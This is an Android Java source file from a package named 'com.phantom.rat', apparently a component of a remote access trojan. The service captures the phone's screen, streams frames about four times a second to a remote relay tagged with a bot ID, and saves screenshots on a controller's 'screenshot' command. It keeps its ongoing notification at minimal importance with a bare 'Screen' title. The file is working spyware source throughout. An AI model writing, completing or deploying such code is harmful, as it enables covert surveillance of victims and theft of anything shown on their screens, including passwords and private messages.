package com.phantom.rat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class ScreenCaptureService extends Service {
    private static final String CH = "phantom_capture";
    private static volatile ScreenCaptureService instance;
    private MediaProjection mp;
    private VirtualDisplay vd;
    private ImageReader reader;
    private HandlerThread ht;
    private Handler h;
    private WebSocketClient relay;
    private int w, hgt;
    private volatile boolean running;

    public static void start(Context ctx) {
        ctx.startActivity(new Intent(ctx, ScreenCaptureActivity.class)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
    }

    public static void stop(Context ctx) {
        ctx.stopService(new Intent(ctx, ScreenCaptureService.class));
    }

    /** Used by CommandExecutor "screenshot" — waits for consent + first frame (max 12s). */
    public static String captureStill(Context ctx) throws Exception {
        start(ctx);
        long t0 = System.currentTimeMillis();
        while (instance == null || instance.mp == null) {
            if (System.currentTimeMillis() - t0 > 12000)
                throw new Exception("screen consent required once");
            Thread.sleep(300);
        }
        return instance.captureNow();
    }

    private String captureNow() throws Exception {
        byte[] frame = takeFrame(5);
        if (frame.length == 0) throw new Exception("no frame captured");
        File dir = new File(getCacheDir(), "screen");
        if (!dir.exists() && !dir.mkdirs()) throw new Exception("no storage");
        String path = new File(dir, "screen_" + System.currentTimeMillis() + ".jpg").getAbsolutePath();
        try (FileOutputStream fos = new FileOutputStream(path)) {
            fos.write(frame);
        }
        return "screenshot " + path + " (" + frame.length + " bytes)";
    }

    private byte[] takeFrame(int timeoutSec) {
        final CountDownLatch latch = new CountDownLatch(1);
        final AtomicReference<byte[]> out = new AtomicReference<>();
        Runnable r = () -> {
            try { out.set(captureFrame()); } catch (Exception ignored) {}
            latch.countDown();
        };
        if (h != null) h.post(r); else new Handler(getMainLooper()).post(r);
        try {
            latch.await(timeoutSec, TimeUnit.SECONDS);
        } catch (InterruptedException ignored) {}
        return out.get() == null ? new byte[0] : out.get();
    }

    private byte[] captureFrame() throws Exception {
        Image image = null;
        try {
            image = reader.acquireLatestImage();
            if (image == null) throw new Exception("no frame");
            Image.Plane plane = image.getPlanes()[0];
            ByteBuffer buf = plane.getBuffer();
            int pixelStride = plane.getPixelStride();
            int rowStride = plane.getRowStride();
            int rowPad = rowStride - pixelStride * w;
            Bitmap bmp = Bitmap.createBitmap(w + rowPad / pixelStride, hgt, Bitmap.Config.ARGB_8888);
            bmp.copyPixelsFromBuffer(buf);
            bmp = Bitmap.createBitmap(bmp, 0, 0, w, hgt);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bmp.compress(Bitmap.CompressFormat.JPEG, 65, baos);
            bmp.recycle();
            return baos.toByteArray();
        } finally {
            if (image != null) image.close();
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel nc = new NotificationChannel(CH, "Screen", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(nc);
            Notification n = new Notification.Builder(this, CH)
                    .setSmallIcon(android.R.drawable.ic_menu_camera)
                    .setContentTitle("Screen").setOngoing(true).build();
            if (Build.VERSION.SDK_INT >= 29) {
                startForeground(2, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
            } else {
                startForeground(2, n);
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        int resultCode = intent == null ? 0 : intent.getIntExtra("code", 0);
        Intent data;
        if (Build.VERSION.SDK_INT >= 33) {
            data = intent == null ? null : intent.getParcelableExtra("data", Intent.class);
        } else {
            data = intent == null ? null : intent.getParcelableExtra("data");
        }
        if (data == null) { stopSelf(); return START_NOT_STICKY; }
        try {
            MediaProjectionManager mpm =
                    (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            mp = mpm.getMediaProjection(resultCode, data);
            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics dm = new DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(dm);
            w = dm.widthPixels;
            hgt = dm.heightPixels;

            reader = ImageReader.newInstance(w, hgt, PixelFormat.RGBA_8888, 2);
            ht = new HandlerThread("screen");
            ht.start();
            h = new Handler(ht.getLooper());
            // AUTO_MIRROR is deprecated in API 34 but remains the required flag for
            // MediaProjection capture; no replacement exists for this use case.
            vd = mp.createVirtualDisplay("phantom", w, hgt, dm.densityDpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.getSurface(), null, h);
            mp.registerCallback(new MediaProjection.Callback() {
                @Override public void onStop() { cleanup(); }
            }, h);
            running = true;
            relay = WebSocketClient.getInstance();
            if (relay != null) {
                relay.sendJsonText("{\"type\":\"hvnc_meta\",\"botId\":\"" + FudUtils.botId(this)
                        + "\",\"w\":" + w + ",\"h\":" + hgt + "}");
                streamLoop();
            }
        } catch (Exception ignored) {
            stopSelf();
        }
        return START_STICKY;
    }

    /** ~4 fps stream — light enough for mobile networks, still "live". */
    private void streamLoop() {
        if (!running || relay == null || !relay.isAlive()) return;
        h.post(() -> {
            if (!running) return;
            try {
                byte[] frame = captureFrame();
                if (frame.length > 0) relay.sendFrame(frame);
            } catch (Exception ignored) {}
            h.postDelayed(this::streamLoop, 250);
        });
    }

    private void cleanup() {
        running = false;
        try { if (vd != null) vd.release(); } catch (Exception ignored) {}
        try { if (mp != null) mp.stop(); } catch (Exception ignored) {}
        try { if (reader != null) reader.close(); } catch (Exception ignored) {}
        if (ht != null) ht.quitSafely();
        vd = null; mp = null; reader = null; relay = null;
        stopSelf();
    }

    @Override
    public void onDestroy() {
        cleanup();
        if (instance == this) instance = null;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
